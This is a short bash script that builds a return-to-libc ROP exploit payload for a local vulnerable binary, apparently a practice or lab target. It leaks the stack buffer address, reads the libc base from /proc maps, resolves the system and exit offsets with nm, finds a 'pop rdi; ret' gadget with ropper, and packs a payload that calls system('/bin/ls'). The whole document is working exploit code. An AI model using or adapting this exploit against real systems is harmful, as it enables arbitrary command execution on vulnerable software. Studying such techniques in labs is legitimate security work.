#!/usr/bin/env bash

usage () {
	echo "usage: $0 <binary name>"
}

print_pointer () {
	printf '%016x\n' $1
}

# convert big endian to little endian
be2le () {
	echo -n $1 | tac -rs..
}

[[ $# != 1 ]] && usage && exit 1
[[ ! -x $1 ]] && usage && exit 2

[[ $libc_path ]] || libc_path=$(find / -name 'libc.so.6' 2>/dev/null)

buffer_address=$(print_pointer $(echo | ./$1 | head -n1))
cat | ./$1 > /dev/null &
libc_base_address=$(print_pointer 0x$(grep -m1 libc- /proc/$(pidof $1)/maps | cut -d'-' -f1))
kill $(pidof $1)
libc_system_offset=$(nm -D $libc_path | grep "\<system\>" | cut -d' ' -f1)
libc_exit_offset=$(nm -D $libc_path | grep "\<exit\>" | cut -d' ' -f1)
gadget_offset=$(ropper -f $libc_path --instructions "pop rdi; ret" --nocolor 2>/dev/null | grep -oPm1 '0x\K[\da-f]+')

libc_system_address=$(print_pointer $((0x$libc_base_address + 0x$libc_system_offset)))
libc_exit_address=$(print_pointer $((0x$libc_base_address + 0x$libc_exit_offset)))
gadget_address=$(print_pointer $((0x$libc_base_address + 0x$gadget_offset)))

if [[ $DEBUG ]]; then
	echo "Buffer address: $buffer_address"
	echo "Libc base address: $libc_base_address"
	echo "Libc system offset: $libc_system_offset"
	echo "Libc system address: $libc_system_address"
	echo "Libc exit offset: $libc_exit_offset"
	echo "Libc exit address: $libc_exit_address"
	echo "Gadget offset: $gadget_offset"
	echo "Gadget address: $gadget_address"
fi | column -t -s:

payload+=$(echo -n '/bin/ls' | xxd -p)
payload+=$(be2le $gadget_address)
payload+=$(be2le $buffer_address)
payload+=$(be2le $libc_system_address)
payload+=$(be2le $libc_exit_address)
